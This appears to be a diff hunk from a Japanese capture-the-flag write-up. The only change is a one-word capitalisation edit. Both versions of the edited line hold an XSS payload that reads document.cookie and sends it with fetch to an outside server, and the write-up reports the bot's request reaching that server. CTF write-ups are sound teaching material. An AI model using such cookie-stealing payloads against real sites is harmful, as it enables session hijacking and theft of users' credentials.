@@ -62,7 +62,7 @@ Botのソースファイル中に以下の記述がみられる。
   }
 ~~~
 ```
-Cookieにあるようなので`<img src="1 onerror=fetch('//s4t.pw?s='+document.cookie)//">`のように持ち出してやればよい。  
+cookieにあるようなので`<img src="1 onerror=fetch('//s4t.pw?s='+document.cookie)//">`のように持ち出してやればよい。  
 Botにクエリを報告すると、以下のリクエストが自身のサーバへ到達した。  
 ```
 GET
